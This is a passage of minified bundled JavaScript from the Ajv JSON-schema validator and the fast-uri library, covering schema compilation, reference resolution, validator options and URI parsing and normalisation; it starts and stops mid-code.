U.default.rootData;if(k[0]==="/"){if(!j1.test(k))throw Error(`Invalid JSON-pointer: ${k}`);r=k,s=U.default.rootData}else{let u1=k1.exec(k);if(!u1)throw Error(`Invalid JSON-pointer: ${k}`);let o1=+u1[1];if(r=u1[2],r==="#"){if(o1>=c)throw Error(i1("property/index",o1));return N1[c-o1]}if(o1>c)throw Error(i1("data",o1));if(s=X1[c-o1],!r)return s}let M1=s,w1=r.split("/");for(let u1 of w1)if(u1)s=z._`${s}${(0,z.getProperty)((0,B.unescapeJsonPointer)(u1))}`,M1=z._`${M1} && ${s}`;return M1;function i1(u1,o1){return`Cannot access ${u1} ${o1} levels up, current level is ${c}`}}X.getData=Y1}),QK=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});class Q extends Error{constructor(J){super("validation failed");this.errors=J,this.ajv=this.validation=!0}}X.default=Q}),wW=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=DW();class J extends Error{constructor(Y,W,G,H){super(H||`can't resolve reference ${G} from id ${W}`);this.missingRef=(0,Q.resolveUrl)(Y,W,G),this.missingSchema=(0,Q.normalizeId)((0,Q.getFullPath)(Y,this.missingRef))}}X.default=J}),JK=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.resolveSchema=X.getCompilingSchema=X.resolveRef=X.compileSchema=X.SchemaEnv=void 0;var Q=V0(),J=QK(),Y=IX(),W=DW(),G=D0(),H=NW();class ${constructor(j){var F;this.refs={},this.dynamicAnchors={};let A;if(typeof j.schema=="object")A=j.schema;this.schema=j.schema,this.schemaId=j.schemaId,this.root=j.root||this,this.baseId=(F=j.baseId)!==null&&F!==void 0?F:(0,W.normalizeId)(A===null||A===void 0?void 0:A[j.schemaId||"$id"]),this.schemaPath=j.schemaPath,this.localRefs=j.localRefs,this.meta=j.meta,this.$async=A===null||A===void 0?void 0:A.$async,this.refs={}}}X.SchemaEnv=$;function z(j){let F=B.call(this,j);if(F)return F;let A=(0,W.getFullPath)(this.opts.uriResolver,j.root.baseId),{es5:O,lines:w}=this.opts.code,{ownProperties:N}=this.opts,C=new Q.CodeGen(this.scope,{es5:O,lines:w,ownProperties:N}),_;if(j.$async)_=C.scopeValue("Error",{ref:J.default,code:Q._`require("ajv/dist/runtime/validation_error").default`});let h=C.scopeName("validate");j.validateName=h;let o={gen:C,allErrors:this.opts.allErrors,data:Y.default.data,parentData:Y.default.parentData,parentDataProperty:Y.default.parentDataProperty,dataNames:[Y.default.data],dataPathArr:[Q.nil],dataLevel:0,dataTypes:[],definedProperties:new Set,topSchemaRef:C.scopeValue("schema",this.opts.code.source===!0?{ref:j.schema,code:(0,Q.stringify)(j.schema)}:{ref:j.schema}),validateName:h,ValidationError:_,schema:j.schema,schemaEnv:j,rootId:A,baseId:j.baseId||A,schemaPath:Q.nil,errSchemaPath:j.schemaPath||(this.opts.jtd?"":"#"),errorPath:Q._`""`,opts:this.opts,self:this},p;try{this._compilations.add(j),(0,H.validateFunctionCode)(o),C.optimize(this.opts.code.optimize);let e=C.toString();if(p=`${C.scopeRefs(Y.default.scope)}return ${e}`,this.opts.code.process)p=this.opts.code.process(p,j);let Q1=Function(`${Y.default.self}`,`${Y.default.scope}`,p)(this,this.scope.get());if(this.scope.value(h,{ref:Q1}),Q1.errors=null,Q1.schema=j.schema,Q1.schemaEnv=j,j.$async)Q1.$async=!0;if(this.opts.code.source===!0)Q1.source={validateName:h,validateCode:e,scopeValues:C._values};if(this.opts.unevaluated){let{props:V1,items:D1}=o;if(Q1.evaluated={props:V1 instanceof Q.Name?void 0:V1,items:D1 instanceof Q.Name?void 0:D1,dynamicProps:V1 instanceof Q.Name,dynamicItems:D1 instanceof Q.Name},Q1.source)Q1.source.evaluated=(0,Q.stringify)(Q1.evaluated)}return j.validate=Q1,j}catch(e){if(delete j.validate,delete j.validateName,p)this.logger.error("Error compiling schema, function code:",p);throw e}finally{this._compilations.delete(j)}}X.compileSchema=z;function U(j,F,A){var O;A=(0,W.resolveUrl)(this.opts.uriResolver,F,A);let w=j.refs[A];if(w)return w;let N=Z.call(this,j,A);if(N===void 0){let C=(O=j.localRefs)===null||O===void 0?void 0:O[A],{schemaId:_}=this.opts;if(C)N=new $({schema:C,schemaId:_,root:j,baseId:F})}if(N===void 0)return;return j.refs[A]=K.call(this,N)}X.resolveRef=U;function K(j){if((0,W.inlineRef)(j.schema,this.opts.inlineRefs))return j.schema;return j.validate?j:z.call(this,j)}function B(j){for(let F of this._compilations)if(q(F,j))return F}X.getCompilingSchema=B;function q(j,F){return j.schema===F.schema&&j.root===F.root&&j.baseId===F.baseId}function Z(j,F){let A;while(typeof(A=this.refs[F])=="string")F=A;return A||this.schemas[F]||M.call(this,j,F)}function M(j,F){let A=this.opts.uriResolver.parse(F),O=(0,W._getFullPath)(this.opts.uriResolver,A),w=(0,W.getFullPath)(this.opts.uriResolver,j.baseId,void 0);if(Object.keys(j.schema).length>0&&O===w)return R.call(this,A,j);let N=(0,W.normalizeId)(O),C=this.refs[N]||this.schemas[N];if(typeof C=="string"){let _=M.call(this,j,C);if(typeof(_===null||_===void 0?void 0:_.schema)!=="object")return;return R.call(this,A,_)}if(typeof(C===null||C===void 0?void 0:C.schema)!=="object")return;if(!C.validate)z.call(this,C);if(N===(0,W.normalizeId)(F)){let{schema:_}=C,{schemaId:h}=this.opts,o=_[h];if(o)w=(0,W.resolveUrl)(this.opts.uriResolver,w,o);return new $({schema:_,schemaId:h,root:j,baseId:w})}return R.call(this,A,C)}X.resolveSchema=M;var L=new Set(["properties","patternProperties","enum","dependencies","definitions"]);function R(j,{baseId:F,schema:A,root:O}){var w;if(((w=j.fragment)===null||w===void 0?void 0:w[0])!=="/")return;for(let _ of j.fragment.slice(1).split("/")){if(typeof A==="boolean")return;let h=A[(0,G.unescapeFragment)(_)];if(h===void 0)return;A=h;let o=typeof A==="object"&&A[this.opts.schemaId];if(!L.has(_)&&o)F=(0,W.resolveUrl)(this.opts.uriResolver,F,o)}let N;if(typeof A!="boolean"&&A.$ref&&!(0,G.schemaHasRulesButRef)(A,this.RULES)){let _=(0,W.resolveUrl)(this.opts.uriResolver,F,A.$ref);N=M.call(this,O,_)}let{schemaId:C}=this.opts;if(N=N||new $({schema:A,schemaId:C,root:O,baseId:F}),N.schema!==N.root.schema)return N;return}}),Su1=S1((X,Q)=>{Q.exports={$id:"https://raw.githubusercontent.com/ajv-validator/ajv/master/lib/refs/data.json#",description:"Meta-schema for $data reference (JSON AnySchema extension proposal)",type:"object",required:["$data"],properties:{$data:{type:"string",anyOf:[{format:"relative-json-pointer"},{format:"json-pointer"}]}},additionalProperties:!1}}),Eu1=S1((X,Q)=>{var J={0:0,1:1,2:2,3:3,4:4,5:5,6:6,7:7,8:8,9:9,a:10,A:10,b:11,B:11,c:12,C:12,d:13,D:13,e:14,E:14,f:15,F:15};Q.exports={HEX:J}}),Tu1=S1((X,Q)=>{var{HEX:J}=Eu1(),Y=/^(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]\d|\d)$/u;function W(j){if(U(j,".")<3)return{host:j,isIPV4:!1};let F=j.match(Y)||[],[A]=F;if(A)return{host:z(A,"."),isIPV4:!0};else return{host:j,isIPV4:!1}}function G(j,F=!1){let A="",O=!0;for(let w of j){if(J[w]===void 0)return;if(w!=="0"&&O===!0)O=!1;if(!O)A+=w}if(F&&A.length===0)A="0";return A}function H(j){let F=0,A={error:!1,address:"",zone:""},O=[],w=[],N=!1,C=!1,_=!1;function h(){if(w.length){if(N===!1){let o=G(w);if(o!==void 0)O.push(o);else return A.error=!0,!1}w.length=0}return!0}for(let o=0;o<j.length;o++){let p=j[o];if(p==="["||p==="]")continue;if(p===":"){if(C===!0)_=!0;if(!h())break;if(F++,O.push(":"),F>7){A.error=!0;break}if(o-1>=0&&j[o-1]===":")C=!0;continue}else if(p==="%"){if(!h())break;N=!0}else{w.push(p);continue}}if(w.length)if(N)A.zone=w.join("");else if(_)O.push(w.join(""));else O.push(G(w));return A.address=O.join(""),A}function $(j){if(U(j,":")<2)return{host:j,isIPV6:!1};let F=H(j);if(!F.error){let{address:A,address:O}=F;if(F.zone)A+="%"+F.zone,O+="%25"+F.zone;return{host:A,escapedHost:O,isIPV6:!0}}else return{host:j,isIPV6:!1}}function z(j,F){let A="",O=!0,w=j.length;for(let N=0;N<w;N++){let C=j[N];if(C==="0"&&O){if(N+1<=w&&j[N+1]===F||N+1===w)A+=C,O=!1}else{if(C===F)O=!0;else O=!1;A+=C}}return A}function U(j,F){let A=0;for(let O=0;O<j.length;O++)if(j[O]===F)A++;return A}var K=/^\.\.?\//u,B=/^\/\.(?:\/|$)/u,q=/^\/\.\.(?:\/|$)/u,Z=/^\/?(?:.|\n)*?(?=\/|$)/u;function M(j){let F=[];while(j.length)if(j.match(K))j=j.replace(K,"");else if(j.match(B))j=j.replace(B,"/");else if(j.match(q))j=j.replace(q,"/"),F.pop();else if(j==="."||j==="..")j="";else{let A=j.match(Z);if(A){let O=A[0];j=j.slice(O.length),F.push(O)}else throw Error("Unexpected dot segment condition")}return F.join("")}function L(j,F){let A=F!==!0?escape:unescape;if(j.scheme!==void 0)j.scheme=A(j.scheme);if(j.userinfo!==void 0)j.userinfo=A(j.userinfo);if(j.host!==void 0)j.host=A(j.host);if(j.path!==void 0)j.path=A(j.path);if(j.query!==void 0)j.query=A(j.query);if(j.fragment!==void 0)j.fragment=A(j.fragment);return j}function R(j){let F=[];if(j.userinfo!==void 0)F.push(j.userinfo),F.push("@");if(j.host!==void 0){let A=unescape(j.host),O=W(A);if(O.isIPV4)A=O.host;else{let w=$(O.host);if(w.isIPV6===!0)A=`[${w.escapedHost}]`;else A=j.host}F.push(A)}if(typeof j.port==="number"||typeof j.port==="string")F.push(":"),F.push(String(j.port));return F.length?F.join(""):void 0}Q.exports={recomposeAuthority:R,normalizeComponentEncoding:L,removeDotSegments:M,normalizeIPv4:W,normalizeIPv6:$,stringArrayToHexStripped:G}}),_u1=S1((X,Q)=>{var J=/^[\da-f]{8}-[\da-f]{4}-[\da-f]{4}-[\da-f]{4}-[\da-f]{12}$/iu,Y=/([\da-z][\d\-a-z]{0,31}):((?:[\w!$'()*+,\-.:;=@]|%[\da-f]{2})+)/iu;function W(O){return typeof O.secure==="boolean"?O.secure:String(O.scheme).toLowerCase()==="wss"}function G(O){if(!O.host)O.error=O.error||"HTTP URIs must have a host.";return O}function H(O){let w=String(O.scheme).toLowerCase()==="https";if(O.port===(w?443:80)||O.port==="")O.port=void 0;if(!O.path)O.path="/";return O}function $(O){return O.secure=W(O),O.resourceName=(O.path||"/")+(O.query?"?"+O.query:""),O.path=void 0,O.query=void 0,O}function z(O){if(O.port===(W(O)?443:80)||O.port==="")O.port=void 0;if(typeof O.secure==="boolean")O.scheme=O.secure?"wss":"ws",O.secure=void 0;if(O.resourceName){let[w,N]=O.resourceName.split("?");O.path=w&&w!=="/"?w:void 0,O.query=N,O.resourceName=void 0}return O.fragment=void 0,O}function U(O,w){if(!O.path)return O.error="URN can not be parsed",O;let N=O.path.match(Y);if(N){let C=w.scheme||O.scheme||"urn";O.nid=N[1].toLowerCase(),O.nss=N[2];let _=`${C}:${w.nid||O.nid}`,h=A[_];if(O.path=void 0,h)O=h.parse(O,w)}else O.error=O.error||"URN can not be parsed.";return O}function K(O,w){let N=w.scheme||O.scheme||"urn",C=O.nid.toLowerCase(),_=`${N}:${w.nid||C}`,h=A[_];if(h)O=h.serialize(O,w);let o=O,p=O.nss;return o.path=`${C||w.nid}:${p}`,w.skipEscape=!0,o}function B(O,w){let N=O;if(N.uuid=N.nss,N.nss=void 0,!w.tolerant&&(!N.uuid||!J.test(N.uuid)))N.error=N.error||"UUID is not valid.";return N}function q(O){let w=O;return w.nss=(O.uuid||"").toLowerCase(),w}var Z={scheme:"http",domainHost:!0,parse:G,serialize:H},M={scheme:"https",domainHost:Z.domainHost,parse:G,serialize:H},L={scheme:"ws",domainHost:!0,parse:$,serialize:z},R={scheme:"wss",domainHost:L.domainHost,parse:L.parse,serialize:L.serialize},j={scheme:"urn",parse:U,serialize:K,skipNormalize:!0},F={scheme:"urn:uuid",parse:B,serialize:q,skipNormalize:!0},A={http:Z,https:M,ws:L,wss:R,urn:j,"urn:uuid":F};Q.exports=A}),ku1=S1((X,Q)=>{var{normalizeIPv6:J,normalizeIPv4:Y,removeDotSegments:W,recomposeAuthority:G,normalizeComponentEncoding:H}=Tu1(),$=_u1();function z(F,A){if(typeof F==="string")F=q(R(F,A),A);else if(typeof F==="object")F=R(q(F,A),A);return F}function U(F,A,O){let w=Object.assign({scheme:"null"},O),N=K(R(F,w),R(A,w),w,!0);return q(N,{...w,skipEscape:!0})}function K(F,A,O,w){let N={};if(!w)F=R(q(F,O),O),A=R(q(A,O),O);if(O=O||{},!O.tolerant&&A.scheme)N.scheme=A.scheme,N.userinfo=A.userinfo,N.host=A.host,N.port=A.port,N.path=W(A.path||""),N.query=A.query;else{if(A.userinfo!==void 0||A.host!==void 0||A.port!==void 0)N.userinfo=A.userinfo,N.host=A.host,N.port=A.port,N.path=W(A.path||""),N.query=A.query;else{if(!A.path)if(N.path=F.path,A.query!==void 0)N.query=A.query;else N.query=F.query;else{if(A.path.charAt(0)==="/")N.path=W(A.path);else{if((F.userinfo!==void 0||F.host!==void 0||F.port!==void 0)&&!F.path)N.path="/"+A.path;else if(!F.path)N.path=A.path;else N.path=F.path.slice(0,F.path.lastIndexOf("/")+1)+A.path;N.path=W(N.path)}N.query=A.query}N.userinfo=F.userinfo,N.host=F.host,N.port=F.port}N.scheme=F.scheme}return N.fragment=A.fragment,N}function B(F,A,O){if(typeof F==="string")F=unescape(F),F=q(H(R(F,O),!0),{...O,skipEscape:!0});else if(typeof F==="object")F=q(H(F,!0),{...O,skipEscape:!0});if(typeof A==="string")A=unescape(A),A=q(H(R(A,O),!0),{...O,skipEscape:!0});else if(typeof A==="object")A=q(H(A,!0),{...O,skipEscape:!0});return F.toLowerCase()===A.toLowerCase()}function q(F,A){let O={host:F.host,scheme:F.scheme,userinfo:F.userinfo,port:F.port,path:F.path,query:F.query,nid:F.nid,nss:F.nss,uuid:F.uuid,fragment:F.fragment,reference:F.reference,resourceName:F.resourceName,secure:F.secure,error:""},w=Object.assign({},A),N=[],C=$[(w.scheme||O.scheme||"").toLowerCase()];if(C&&C.serialize)C.serialize(O,w);if(O.path!==void 0)if(!w.skipEscape){if(O.path=escape(O.path),O.scheme!==void 0)O.path=O.path.split("%3A").join(":")}else O.path=unescape(O.path);if(w.reference!=="suffix"&&O.scheme)N.push(O.scheme,":");let _=G(O);if(_!==void 0){if(w.reference!=="suffix")N.push("//");if(N.push(_),O.path&&O.path.charAt(0)!=="/")N.push("/")}if(O.path!==void 0){let h=O.path;if(!w.absolutePath&&(!C||!C.absolutePath))h=W(h);if(_===void 0)h=h.replace(/^\/\//u,"/%2F");N.push(h)}if(O.query!==void 0)N.push("?",O.query);if(O.fragment!==void 0)N.push("#",O.fragment);return N.join("")}var Z=Array.from({length:127},(F,A)=>/[^!"$&'()*+,\-.;=_`a-z{}~]/u.test(String.fromCharCode(A)));function M(F){let A=0;for(let O=0,w=F.length;O<w;++O)if(A=F.charCodeAt(O),A>126||Z[A])return!0;return!1}var L=/^(?:([^#/:?]+):)?(?:\/\/((?:([^#/?@]*)@)?(\[[^#/?\]]+\]|[^#/:?]*)(?::(\d*))?))?([^#?]*)(?:\?([^#]*))?(?:#((?:.|[\n\r])*))?/u;function R(F,A){let O=Object.assign({},A),w={scheme:void 0,userinfo:void 0,host:"",port:void 0,path:"",query:void 0,fragment:void 0},N=F.indexOf("%")!==-1,C=!1;if(O.reference==="suffix")F=(O.scheme?O.scheme+":":"")+"//"+F;let _=F.match(L);if(_){if(w.scheme=_[1],w.userinfo=_[3],w.host=_[4],w.port=parseInt(_[5],10),w.path=_[6]||"",w.query=_[7],w.fragment=_[8],isNaN(w.port))w.port=_[5];if(w.host){let o=Y(w.host);if(o.isIPV4===!1){let p=J(o.host);w.host=p.host.toLowerCase(),C=p.isIPV6}else w.host=o.host,C=!0}if(w.scheme===void 0&&w.userinfo===void 0&&w.host===void 0&&w.port===void 0&&w.query===void 0&&!w.path)w.reference="same-document";else if(w.scheme===void 0)w.reference="relative";else if(w.fragment===void 0)w.reference="absolute";else w.reference="uri";if(O.reference&&O.reference!=="suffix"&&O.reference!==w.reference)w.error=w.error||"URI is not a "+O.reference+" reference.";let h=$[(O.scheme||w.scheme||"").toLowerCase()];if(!O.unicodeSupport&&(!h||!h.unicodeSupport)){if(w.host&&(O.domainHost||h&&h.domainHost)&&C===!1&&M(w.host))try{w.host=URL.domainToASCII(w.host.toLowerCase())}catch(o){w.error=w.error||"Host's domain name can not be converted to ASCII: "+o}}if(!h||h&&!h.skipNormalize){if(N&&w.scheme!==void 0)w.scheme=unescape(w.scheme);if(N&&w.host!==void 0)w.host=unescape(w.host);if(w.path)w.path=escape(unescape(w.path));if(w.fragment)w.fragment=encodeURI(decodeURIComponent(w.fragment))}if(h&&h.parse)h.parse(w,O)}else w.error=w.error||"URI can not be parsed.";return w}var j={SCHEMES:$,normalize:z,resolve:U,resolveComponents:K,equal:B,serialize:q,parse:R};Q.exports=j,Q.exports.default=j,Q.exports.fastUri=j}),bu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0});var Q=ku1();Q.code='require("ajv/dist/runtime/uri").default',X.default=Q}),vu1=S1((X)=>{Object.defineProperty(X,"__esModule",{value:!0}),X.CodeGen=X.Name=X.nil=X.stringify=X.str=X._=X.KeywordCxt=void 0;var Q=NW();Object.defineProperty(X,"KeywordCxt",{enumerable:!0,get:function(){return Q.KeywordCxt}});var J=V0();Object.defineProperty(X,"_",{enumerable:!0,get:function(){return J._}}),Object.defineProperty(X,"str",{enumerable:!0,get:function(){return J.str}}),Object.defineProperty(X,"stringify",{enumerable:!0,get:function(){return J.stringify}}),Object.defineProperty(X,"nil",{enumerable:!0,get:function(){return J.nil}}),Object.defineProperty(X,"Name",{enumerable:!0,get:function(){return J.Name}}),Object.defineProperty(X,"CodeGen",{enumerable:!0,get:function(){return J.CodeGen}});var Y=QK(),W=wW(),G=pN(),H=JK(),$=V0(),z=DW(),U=UW(),K=D0(),B=Su1(),q=bu1(),Z=(E,y)=>new RegExp(E,y);Z.code="new RegExp";var M=["removeAdditional","useDefaults","coerceTypes"],L=new Set(["validate","serialize","parse","wrapper","root","schema","keyword","pattern","formats","validate$data","func","obj","Error"]),R={errorDataPath:"",format:"`validateFormats: false` can be used instead.",nullable:'"nullable" keyword is supported by default.',jsonPointers:"Deprecated jsPropertySyntax can be used instead.",extendRefs:"Deprecated ignoreKeywordsWithRef can be used instead.",missingRefs:"Pass empty schema with $id that should be ignored to ajv.addSchema.",processCode:"Use option `code: {process: (code, schemaEnv: object) => string}`",sourceCode:"Use option `code: {source: true}`",strictDefaults:"It is default now, see option `strict`.",strictKeywords:"It is default now, see option `strict`.",uniqueItems:'"uniqueItems" keyword is always validated.',unknownFormats:"Disable strict mode or pass `true` to `ajv.addFormat` (or `formats` option).",cache:"Map is used as cache, schema object as key.",serialize:"Map is used as cache, schema object as key.",ajvErrors:"It is default now."},j={ignoreKeywordsWithRef:"",jsPropertySyntax:"",unicode:'"minLength"/"maxLength" account for unicode characters by default.'},F=200;function A(E){var y,a,I,v,g,H1,z1,P1,j1,k1,Y1,k,c,X1,N1,r,s,M1,w1,i1,u1,o1,k0,b0,B8;let i9=E.strict,F6=(y=E.code)===null||y===void 0?void 0:y.optimize,q8=F6===!0||F6===void 0?1:F6||0,t9=(I=(a=E.code)===null||a===void 0?void 0:a.regExp)!==null&&I!==void 0?I:Z,O6=(v=E.uriResolver)!==null&&v!==void 0?v:q.default;return{strictSchema:(H1=(g=E.strictSchema)!==null&&g!==void 0?g:i9)!==null&&H1!==void 0?H1:!0,strictNumbers:(P1=(z1=E.strictNumbers)!==null&&z1!==void 0?z1:i9)!==null&&P1!==void 0?P1:!0,strictTypes:(k1=(j1=E.strictTypes)!==null&&j1!==void 0?j1:i9)!==null&&k1!==void 0?k1:"log",strictTuples:(k=(Y1=E.strictTuples)!==null&&Y1!==void 0?Y1:i9)!==null&&k!==void 0?k:"log",strictRequired:(X1=(c=E.strictRequired)!==null&&c!==void 0?c:i9)!==null&&X1!==void 0?X1:!1,code:E.code?{...E.code,optimize:q8,regExp:t9}:{optimize:q8,regExp:t9},loopRequired:(N1=E.loopRequired)!==null&&N1!==void 0?N1:F,loopEnum:(r=E.loopEnum)!==null&&r!==void 0?r:F,meta:(s=E.meta)!==null&&s!==void 0?s:!0,messages:(M1=E.messages)!==null&&M1!==void 0?M1:!0,inlineRefs:(w1=E.inlineRefs)!==null&&w1!==void 0?w1:!0,schemaId:(i1=E.schemaId)!==null&&i1!==void 0?i1:"$id",addUsedSchema:(u1=E.addUsedSchema)!==null&&u1!==void 0?u1:!0,validateSchema:(o1=E.validateSchema)!==null&&o1!==void 0?o1:!0,validateFormats:(k0=E.validateFormats)!==null&&k0!==void 0?k0:!0,unicodeRegExp:(b0=E.unicodeRegExp)!==null&&b0!==void 0?b0:!0,int32range:(B8=E.int32range)!==null&&B8!==void 0?B8:!0,uriResolver:O6}}class O{constructor(E={}){this.schemas={},this.refs={},this.formats={},this._compilations=new Set,this._loading={},this._cache=new Map,E=this.opts={...E,...A(E)};let{es5:y,lines:a}=this.opts.code;this.scope=new $.ValueScope({scope:{},prefixes:L,es5:y,lines:a}),this.logger=e(E.logger);let I=E.validateFormats;if(E.validateFormats=!1,this.RULES=(0,G.getRules)(),w.call(this,R,E,"NOT SUPPORTED"),w.call(this,j,E,"DEPRECATED","warn"),this._metaOpts=o.call(this),E.formats)_.call(this);if(this._addVocabularies(),this._addDefaultMetaSchema(),E.keywords)h.call(this,E.keywords);if(typeof E.meta=="object")this.addMetaSchema(E.meta);C.call(this),E.validateFormats=I}_addVocabularies(){this.addKeyword("$async")}_addDefaultMetaSchema(){let{$data:E,meta:y,schemaId:a}=this.opts,I=B;if(a==="id")I={...B},I.id=I.$id,delete I.$id;if(y&&E)this.addMetaSchema(I,I[a],!1)}defaultMeta(){let{meta:E,schemaId:y}=this.opts;return this.opts.defaultMeta=typeof E=="object"?E[y]||E:void 0}validate(E,y){let a;if(typeof E=="string"){if(a=this.getSchema(E),!a)throw Error(`no schema with key or ref "${E}"`)}else a=this.compile(E);let I=a(y);if(!("$async"in a))this.errors=a.errors;return I}compile(E,y){let a=this._addSchema(E,y);return a.validate||this._compileSchemaEnv(a)}compileAsync(E,y){if(typeof this.opts.loadSchema!="function")throw Error("options.loadSchema should be a function");let{loadSchema:a}=this.opts;return I.call(this,E,y);async function I(j1,k1){await v.call(this,j1.$schema);let Y1=this._addSchema(j1,k1);return Y1.validate||g.call(this,Y1)}async function v(j1){if(j1&&!this.getSchema(j1))await I.call(this,{$ref:j1},!0)}async function g(j1){try{return this._compileSchemaEnv(j1)}catch(k1){if(!(k1 instanceof W.default))throw k1;return H1.call(this,k1),await z1.call(this,k1.missingSchema),g.call(this,j1)}}function H1({missingSchema:j1,missingRef:k1}){if(this.refs[j1])throw Error(`AnySchema ${j1} is loaded but ${k1} cannot be resolved`)}async function z1(j1){let k1=await P1.call(this,j1);if(!this.refs[j1])await v.call(this,k1.$schema);if(!this.refs[j1])this.addSchema(k1,j1,y)}async function P1(j1){let k1=this._loading[j1];if(k1)return k1;try{return await(this._loading[j1]=a(j1))}finally{delete this._loading[j1]}}}addSchema(E,y,a,I=this.opts.validateSchema){if(Array.isArray(E)){for(let g of E)this.addSchema(g,void 0,a,I);return this}let v;if(typeof E==="object"){let{schemaId:g}=this.opts;if(v=E[g],v!==void 0&&typeof v!="string")throw Error(`schema ${g} must be string`)}return y=(0,z.normalizeId)(y||v),this._checkUnique(y),this.schemas[y]=this._addSchema(E,a,y,I,!0),this}addMetaSchema(E,y,a=this.opts.validateSchema){return this.addSchema(E,y,!0,a),this}validateSchema(E,y){if(typeof E=="boolean")return!0;let a;if(a=E.$schema,a!==void 0&&typeof a!="string")throw Error("$schema must be a string");if(a=a||this.opts.defaultMeta||this.defaultMeta(),!a)return this.logger.warn("meta-schema not available"),this.errors=null,!0;let I=this.validate(a,E);if(!I&&y){let v="schema is invalid: "+this.errorsText();if(this.opts.validateSchema==="log")this.logger.error(v);else throw Error(v)}return I}getSchema(E){let y;while(typeof(y=N.call(this,E))=="string")E=y;if(y===void 0){let{schemaId:a}=this.opts,I=new H.SchemaEnv({schema:{},schemaId:a});if(y=H.resolveSchema.call(this,I,E),!y)return;this.refs[E]=y}return y.validate||this._compileSchemaEnv(y)}removeSchema(E){if(E instanceof RegExp)return this._removeAllSchemas(this.schemas,E),this._removeAllSchemas(this.refs,E),this;switch(typeof E){case"undefined":return this._removeAllSchemas(this.schemas),this._removeAllSchemas(this.refs),this._cache.clear(),this;case"string":{let y=N.call(this,E);if(typeof y=="object")this._cache.delete(y.schema);return delete this.schemas[E],delete this.refs[E],this}case"object":{let y=E;this._cache.delete(y);let a=E[this.opts.schemaId];if(a)a=(0,z.normalizeId)(a),delete this.schemas[a],delete this.refs[a];return this}default:throw Error("ajv.removeSchema: invalid parameter")}}addVocabulary(E){for(let y of E)this.addKeyword(y);return this}addKeyword(E,y){let a;if(typeof E=="string"){if(a=E,typeof y=="object")this.logger.warn("these parameters are deprecated, see docs for addKeyword"),y.keyword=a}else if(typeof E=="object"&&y===void 0){if(y=E,a=y.keyword,Array.isArray(a)&&!a.length)throw Error("addKeywords: keyword must be string or non-empty array")}else throw Error("invalid addKeywords parameters");if(Q1.call(this,a,y),!y)return(0,K.eachItem)(a,(v)=>V1.call(this,v)),this;n.call(this,y);let I={...y,type:(0,U.getJSONTypes)(y.type),schemaType:(0,U.getJSONTypes)(y.schemaType)};return(0,K.eachItem)(a,I.type.length===0?(v)=>V1.call(this,v,I):(v)=>I.type.forEach((g)=>V1.call(this,v,I,g))),this}getKeyword(E){let y=this.RULES.all[E];return typeof y=="object"?y.definition:!!y}removeKeyword(E){let{RULES:y}=this;delete y.keywords[E],delete y.all[E];for(let a of y.rules){let I=a.rules.findIndex((v)=>v.keyword===E);if(I>=0)a.rules.splice(I,1)}return this}addFormat(E,y){if(typeof y=="string")y=new RegExp(y);return this.formats[E]=y,this}errorsText(E=this.errors,{separator:y=", ",dataVar:a="data"}={}){if(!E||E.length===0)return"No errors";return E.map((I)=>`${a}${I.instancePath} ${I.message}`).reduce((I,v)=>I+y+v)}$dataMetaSchema(E,y){let a=this.RULES.all;E=JSON.parse(JSON.stringify(E));for(let I of y){let v=I.split("/").slice(1),g=E;for(let H1 of v)g=g[H1];for(let H1 in a){let z1=a[H1];if(typeof z1!="object")continue;let{$data:P1}=z1.definition,j1=g[H1];if(P1&&j1)g[H1]=u(j1)}}return E}_removeAllSchemas(E,y){for(let a in E){let I=E[a];if(!y||y.test(a)){if(typeof I=="string")delete E[a];else if(I&&!I.meta)this._cache.delete(I.schema),delete E[a]}}}_addSchema(E,y,a,I=this.opts.validateSchema,v=this.opts.addUsedSchema){let g,{schemaId:H1}=this.opts;if(typeof E=="object")g=E[H1];else if(this.opts.jtd)throw Error("schema must be object");else if(typeof E!="boolean")throw Error("schema must be object or boolean");let z1=this._cache.get(E);if(z1!==void 0)return z1;a=(0,z.normalizeId)(g||a);let P1=z.getSchemaRefs.call(this,E,a);if(z1=new H.SchemaEnv({schema:E,schemaId:H1,meta:y,baseId:a,localRefs:P1}),this._cache.set(z1.schema,z1),v&&!a.startsWith("#")){if(a)this._checkUnique(a);this.refs[a]=z1}if(I)this.validateSchema(E,!0);return z1}_checkUnique(E){if(this.schemas[E]||this.refs[E])throw Error(`schema with key or id "${E}" already exists`)}_compileSchemaEnv(E){if(E.meta)this._compileMetaSchema(E);else H.compileSchema.call(this,E);if(!E.validate)throw Error("ajv implementation error");return E.validate}_compileMetaSchema(E){let y=this.opts;this.opts=this._metaOpts;try{H.compileSchema.call(this,E)}finally{this.opts=y}}}O.ValidationError=Y.default,O.MissingRefError=W.default,X.default=O;function w(E,y,a,I="error"){for(let v in E){let g=v;if(g in y)this.logger[I](`${a}: option ${v}. ${E[g]}`)}}function N(E){return E=(0,z.normalizeId)(E),this.schemas[E]||this.refs[E]}function C(){let E=this.opts.schemas;if(!E)return;if(Array.isArray(E))this.addSchema(E);else for(let y in E)this.addSchema(E[y],y)}function _(){for(let E in this.opts.formats){let y=this.opts.formats[E];if(y)this.addFormat(E,y)}}function h(E){if(Array.isArray(E)){this.addVocabulary(E);return}this.logger.warn("keywords option as map is deprecated, pass array");for(let y in E){let a=E[y];if(!a.keyword)a.keyword=y;this.addKeyword(a)}}function o(){let E={...this.opts};for(let y of M)delete E[y];return E}var p={log(){},warn(){},error(){}};function e(E){if(E===!1)return p;if(E===void 0)return console;if(E.log&&E.warn&&E.error)return E;throw Error("logger must implement log, warn and error methods")}var d=/^[a-z_$][a-z0-9_$:-]*$/i;function Q1(E,y){let{RULES:a}=this;if((0,K.eachItem)(E,(I)=>{if(a.keywords[I])throw Error(`Keyword ${I} is already defined`);if(!d.test(I))throw Error(`Keyword ${I} has invalid name`)}),!y)return;if(y.$data&&!(("code"in y)||("validate"in y)))throw Error('$data keyword must have "code" or "validate" function')}function V1(E,y,a){var I;let v=y===null||y===void 0?void 0:y.post;if(a&&v)throw Error('keyword with "post" flag cannot have "type"');let{RULES:g}=this,H1=v?g.post:g.rules.find(({type:P1})=>P1===a);if(!H1)H1={type:a,rules:[]},g.rules.push(H1);if(g.keywords[E]=!0,!y)return;let 